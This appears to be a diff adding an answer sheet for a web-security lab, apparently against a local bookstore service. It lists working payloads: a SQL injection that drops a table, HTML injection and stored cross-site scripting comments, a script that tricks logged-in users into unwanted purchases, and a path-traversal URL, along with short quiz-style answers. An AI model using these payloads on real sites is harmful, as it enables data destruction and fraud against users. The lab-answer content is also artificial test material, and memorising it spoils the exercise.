@@ -1,0 +1,71 @@
+N01:
+38 book titles
+-------------------------------------------------------------------------------------
+
+N02:
+55 bluray titles
+-------------------------------------------------------------------------------------
+
+N03:
+http://localhost:8188/Service.svc/booksearch?term=d';DROP TABLE Books;
+-------------------------------------------------------------------------------------
+
+N04:
+POST http://localhost:8188/Service.svc/comment?name=mo HTTP/1.1
+Host: localhost:8188
+Content-Type: application/json
+Content-Length: 25
+
+"<h1>HTML Injection</h1>"
+-------------------------------------------------------------------------------------
+
+N05:
+POST http://localhost:8188/Service.svc/comment?name=mo HTTP/1.1
+Host: localhost:8188
+Content-Type: application/json
+Content-Length: 85
+
+"<img src=\"https://pbs.twimg.com/profile_images/722602576001171456/Z7D4lD7A.jpg\"/>"
+-------------------------------------------------------------------------------------
+
+N06:
+POST http://localhost:8188/Service.svc/comment?name=mo HTTP/1.1
+Host: localhost:8188
+Content-Type: application/json
+Content-Length: 39
+
+"<script>alert(\"Injection\")</script>"
+-------------------------------------------------------------------------------------
+
+N07:
+The attacker could insert a link in the comments which calls a function that inserts an image that has its source assigned to the buy url, a logged on user would click that link and buy a book without their knowledge as no alert box or anything will be displayed
+-------------------------------------------------------------------------------------
+
+N08:
+POST http://localhost:8188/Service.svc/comment?name=mo HTTP/1.1
+Host: localhost:8188
+Content-Type: application/json
+Content-Length: 229
+
+"<script>function test(){document.body.innerHTML+=\"<img src=\\\"http://localhost:8189/Service.svc/bookbuy?id=cd002\\\"/>\"}document.body.innerHTML+=\"<a href=\\\"#\\\" onclick=\\\"test()\\\">CLICK FOR A SURPRISE!</a>\"</script>"
+-------------------------------------------------------------------------------------
+
+C01:
+SQLite format 3
+-------------------------------------------------------------------------------------
+
+C02:
+4 tables
+-------------------------------------------------------------------------------------
+
+C03:
+user1125
+-------------------------------------------------------------------------------------
+
+C04:
+reverse
+-------------------------------------------------------------------------------------
+
+C05:
+http://localhost:8188/Service.svc/bookimg?id=..\BluraysBig\Galapagos
+
